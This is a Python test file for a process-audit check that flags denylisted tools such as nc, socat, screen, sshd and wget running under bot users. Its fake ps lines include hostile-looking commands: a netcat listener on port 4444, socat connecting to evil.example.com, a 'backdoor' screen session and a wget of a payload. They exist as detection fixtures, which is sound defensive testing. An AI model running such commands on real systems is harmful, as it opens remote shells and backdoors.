"""Tests for audit.audit_process — suspicious long-running processes.

The check walks ps aux and flags processes under a bot user that match
the _SUSPICIOUS_PROCS denylist (install tooling, network swiss-army
knives, interactive backgrounders, privilege-escalation daemons).
Time-gated to once every 6 hours.

Gap #6 of the Security_bot retirement coverage map expanded the denylist
from its original 6 entries to ~20 (covering nc/socat/screen/tmux/
sshd/sudo/su/wget/etc.) and removed the redundant admin-user-gateway
block — that responsibility moved to _check_admin_user_gateway
(15-min cadence, operator-facing playbook).
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

_ANALYZER_DIR = Path(__file__).parent.parent
if str(_ANALYZER_DIR) not in sys.path:
    sys.path.insert(0, str(_ANALYZER_DIR))

import audit  # noqa: E402


def _ps_line(user: str, cmd: str, pid: int = 12345) -> str:
    """Synthesize a ps aux line: USER PID %CPU %MEM ... CMD."""
    return (
        f"{user:15s} {pid:5d}   0.5  1.2  408392832  98765   ??  S    "
        f"10:30AM  0:42.10 {cmd}"
    )


def _fake_completed(lines: list[str], returncode: int = 0):
    header = "USER             PID  %CPU %MEM       VSZ    RSS   TT  STAT STARTED      TIME COMMAND"
    body = "\n".join([header] + lines)
    return subprocess.CompletedProcess(
        args=[], returncode=returncode, stdout=body, stderr="",
    )


# ── threat-model coverage of the expanded denylist ────────────────────


def test_nc_under_bot_user_emits_warn(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("admin_bot", "/usr/bin/nc -lvp 4444")]),
    )
    findings = audit.audit_process(["admin_bot"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "nc" in f.message for f in findings)
    assert any("foothold" in (f.what_it_means or "") for f in findings)


def test_socat_under_bot_user_emits_warn(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("team_bot_a", "/opt/homebrew/bin/socat - TCP:evil.example.com:80")]),
    )
    findings = audit.audit_process(["team_bot_a"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "socat" in f.message for f in findings)


def test_screen_under_bot_user_emits_warn(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("admin_bot", "/usr/bin/screen -dmS backdoor bash")]),
    )
    findings = audit.audit_process(["admin_bot"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "screen" in f.message for f in findings)


def test_sshd_under_bot_user_emits_warn(tmp_path: Path, monkeypatch):
    """A bot user shouldn't be running its own ssh daemon — listening
    persistence primitive."""
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("team_bot_c", "/usr/sbin/sshd -p 2222")]),
    )
    findings = audit.audit_process(["team_bot_c"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "sshd" in f.message for f in findings)


def test_wget_under_bot_user_emits_warn(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("evo", "/opt/homebrew/bin/wget https://example.com/payload")]),
    )
    findings = audit.audit_process(["evo"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "wget" in f.message for f in findings)


def test_alternate_package_managers_flagged(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([
            _ps_line("team_bot_a", "/usr/bin/apt-get install foo", pid=1),
            _ps_line("admin_bot", "/usr/bin/yum install bar", pid=2),
            _ps_line("evo", "/usr/local/bin/gem install baz", pid=3),
        ]),
    )
    findings = audit.audit_process(["team_bot_a", "admin_bot", "evo"], "pod_admin_user", tmp_path)
    flagged_cmds = {f.message.split(":")[-1].strip() for f in findings if f.level == "warn"}
    assert "apt-get" in flagged_cmds
    assert "yum" in flagged_cmds
    assert "gem" in flagged_cmds


# ── consolidation: admin-user-gateway moved out ────────────────────────


def test_audit_process_no_longer_flags_admin_gateway(tmp_path: Path, monkeypatch):
    """The admin-user-gateway critical moved to _check_admin_user_gateway
    so the 15-min audit cycle catches it (vs the 6h audit_process gate).
    audit_process should no longer emit a critical for this case."""
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([
            _ps_line(
                "pod_admin_user",
                "/opt/homebrew/bin/node /opt/homebrew/lib/node_modules/openclaw/dist/index.js gateway",
            ),
        ]),
    )
    findings = audit.audit_process(["team_bot_a", "admin_bot"], "pod_admin_user", tmp_path)
    # No critical, no mention of admin user gateway from this function.
    assert all(f.level != "critical" for f in findings)
    assert all("admin user" not in f.message for f in findings)


# ── existing behavior preserved ────────────────────────────────────────


def test_npm_still_flagged(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([_ps_line("team_bot_a", "/opt/homebrew/bin/npm install")]),
    )
    findings = audit.audit_process(["team_bot_a"], "pod_admin_user", tmp_path)
    assert any(f.level == "warn" and "npm" in f.message for f in findings)


def test_clean_ps_emits_ok(tmp_path: Path, monkeypatch):
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([
            _ps_line(
                "team_bot_a",
                "/opt/homebrew/bin/node /opt/homebrew/lib/node_modules/openclaw/dist/index.js gateway",
            ),
        ]),
    )
    findings = audit.audit_process(["team_bot_a"], "pod_admin_user", tmp_path)
    assert findings == [audit.Finding(
        level="ok", category="machine", bot_id=None,
        message="machine: process audit OK",
    )]


def test_non_bot_user_running_suspicious_proc_ignored(tmp_path: Path, monkeypatch):
    """Suspicious tools running under non-bot users (pod_admin_user, root) are
    out of scope — this check is about bots."""
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([
            _ps_line("pod_admin_user", "/usr/bin/nc -lvp 4444"),
            _ps_line("root", "/usr/bin/screen"),
        ]),
    )
    findings = audit.audit_process(["team_bot_a", "admin_bot"], "pod_admin_user", tmp_path)
    assert all(f.level == "ok" for f in findings)


# ── time-gating ─────────────────────────────────────────────────────────


def test_time_gate_prevents_rerun_within_6h(tmp_path: Path, monkeypatch):
    """Once audit_process runs, subsequent calls within 6h return []."""
    monkeypatch.setattr(
        audit.subprocess, "run",
        lambda *_a, **_k: _fake_completed([]),
    )
    first = audit.audit_process(["team_bot_a"], "pod_admin_user", tmp_path)
    assert first, "first run should produce a finding"
    second = audit.audit_process(["team_bot_a"], "pod_admin_user", tmp_path)
    assert second == [], "second run within 6h should be gated out"
